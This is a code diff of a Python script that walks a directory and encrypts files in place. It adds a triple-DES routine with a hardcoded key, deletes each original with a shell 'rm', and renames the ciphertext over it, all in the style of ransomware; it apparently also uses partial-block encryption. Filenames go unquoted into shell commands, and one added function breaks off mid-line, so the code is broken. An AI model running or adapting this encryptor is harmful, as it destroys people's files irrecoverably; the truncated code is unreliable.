@@ -25,13 +25,18 @@ def free_memory():
     gc.collect(1)
     gc.collect(2)
 
-from Cryptodome.Cipher import AES
+from Cryptodome.Cipher import AES, DES3
+
 from hashlib import md5
 
 password = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
 BLOCK_SIZE = 16
 
-EXTREMITY_SIZE = 128
+EXTREMITY_SIZE = (128 // 2)
+
+def readimage(path):
+    with open(path, "rb") as f:
+        return bytearray(f.read())
 
 def pad (data):
     pad = BLOCK_SIZE - len(data) % BLOCK_SIZE
@@ -49,9 +54,15 @@ def encrypt_buffer(data, nonce, password):
     #print(f"Encryption time: {time.perf_counter() - t1} s")
     return ciphertext
 
-def readimage(path):
-    with open(path, "rb") as f:
-        return bytearray(f.read())
+def encrypt_buffer_des3(data, nonce, password):
+    key = b'123456789012345678901234'
+    while 0 != len(data) % 8:
+        data = data + b'a'
+    key = DES3.adjust_key_parity(key)
+    cipher = DES3.new(key, DES3.MODE_CBC)
+    ciphertext = cipher.encrypt(data)
+    return ciphertext
+
 
 def encrypt_full_file(filename):
     if os.path.isfile(filename):
@@ -64,6 +75,22 @@ def encrypt_full_file(filename):
         os.system(f"mv {output_filename} {filename}")
         #print(f"Encrypted {filename}")
     return {filename: True}
+
+def encrypt_full_file_des3(filename):
+    if os.path.isfile(filename):
+        encrypted_buffer = encrypt_buffer_des3(readimage(filename), "", password)
+        output_filename = f"{filename}.out"
+        with open (output_filename, "wb") as f:
+            f.write(encrypted_buffer)
+            f.close()
+        os.system(f"rm {filename}")
+        os.system(f"mv {output_filename} {filename}")
+        #print(f"Encrypted {filename}")
+    return {filename: True}
+
+def encrypt_des3_full_file(filename):
+    if os.path.isfile(filename):
+        encrypt_
 
 
 def encrypt_file_alternate_blocksv2_unopt(block_size):
@@ -227,6 +254,7 @@ def iterate_files(base_dir):
 
     encryption_fn = encrypt_full_file
     encryption_fn = encrypt_file_alternate_blocksv2_opt(BLOCK_SIZE)
+    encryption_fn = encrypt_full_file_des3
     try:
         savedir = os.getcwd()
         os.chdir(base_dir)
